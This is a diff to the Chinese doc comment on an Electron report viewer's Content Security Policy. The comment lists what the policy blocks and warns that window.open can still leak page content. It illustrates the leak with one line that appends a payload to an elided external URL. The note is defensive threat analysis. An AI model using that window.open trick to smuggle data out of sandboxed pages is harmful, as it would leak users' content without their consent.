@@ -9,10 +9,23 @@
 
 /**
  * 报告文档的 CSP。允许内联脚本与内联样式（报告的动效与版式全靠它们），
- * 但 `default-src 'none'` + `connect-src 'none'` 让页面**一个字节都发不出去也收不进来**。
+ * `default-src 'none'` + `connect-src 'none'` + `form-action 'none'` 让页面里的脚本
+ * **发不出 fetch / XHR / WebSocket、也提交不了表单**，外部子资源（img / font / style）
+ * 全部锁死在 `data:`。
  *
- * 这条串是实测过的原样：改动任何一项都要重新实测，不要凭直觉增删。
- * 比 v1「不给 allow-scripts」的姿势更严 —— v1 挡脚本但不挡外部子资源请求。
+ * ⚠️ 它管不到 `window.open`：CSP 没有任何指令约束弹窗（`connect-src` 管的是
+ * fetch/XHR/WS，`form-action` 管的是表单）。sandbox 串给了
+ * `allow-popups allow-popups-to-escape-sandbox`（DOI 外链要用），而 main.ts 的
+ * `setWindowOpenHandler` 会把任何 http(s) / mailto URL 交给 `shell.openExternal` ——
+ * 也就是说报告里的脚本可以 `window.open('https://…/?d=' + payload)`，把它自己页面里的
+ * 内容拼进 URL 带到系统浏览器里去，Electron 这一侧没有弹窗拦截、也不要求用户手势。
+ * 边际风险很小（能带走的只有这份报告自己的内容 + 查看器从它自己目录树内联进来的图，
+ * 且只在用户主动打开不可信 .html 时），但**别把「网络全封死」当成放宽沙箱的依据**——
+ * 要真堵这条路得在 `setWindowOpenHandler` 里加 URL 策略，那是另一个独立决定。
+ *
+ * 这条串是实测过的原样：改动任何一项都要重新实测，不要凭直觉增删
+ * （reportTheme.test.ts 用一条全串等值断言锁着它）。
+ * 比 v1「不给 allow-scripts」的姿势严的地方在子资源：v1 挡脚本但不挡外部子资源请求。
  */
 export const REPORT_CSP =
   "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
